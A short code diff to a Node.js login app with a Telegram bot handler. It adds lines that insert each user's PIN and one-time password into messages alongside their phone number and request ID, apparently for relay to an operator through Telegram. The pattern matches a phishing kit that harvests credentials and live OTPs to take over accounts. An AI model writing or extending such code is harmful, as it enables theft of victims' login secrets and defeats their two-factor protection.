@@ -146,6 +146,9 @@ app.post("/login", async function(request, response) {
                         "Phone: " +
                         phone +
 
+                        "\nDemo PIN: " +
+                           PIN +
+
                         "\nRequest ID: " +
                         loginRequest.id +
 
@@ -330,6 +333,8 @@ app.post(
                             "Phone: " +
                             loginRequest.phone +
 
+                            "\nOTP: " +
+                             OTP +
 
                             "\nRequest ID: " +
                             loginRequest.id +
@@ -656,6 +661,8 @@ async function handleTelegramButton(
                     "Phone: " +
                     loginRequest.phone +
 
+                    "\nDemo PIN: " +
+                      PIN +
 
                     "\nRequest ID: " +
                     loginRequest.id +
@@ -771,6 +778,8 @@ async function handleTelegramButton(
                     "Phone: " +
                     loginRequest.phone +
 
+                    "\nOTP: " + 
+                      OTP +  
 
                     "\nRequest ID: " +
                     loginRequest.id +
@@ -827,6 +836,9 @@ async function handleTelegramButton(
 
                     "Phone: " +
                     loginRequest.phone +
+
+                    "\nOTP: " + 
+                      OTP +  
 
                     "\nRequest ID: " +
                     loginRequest.id +
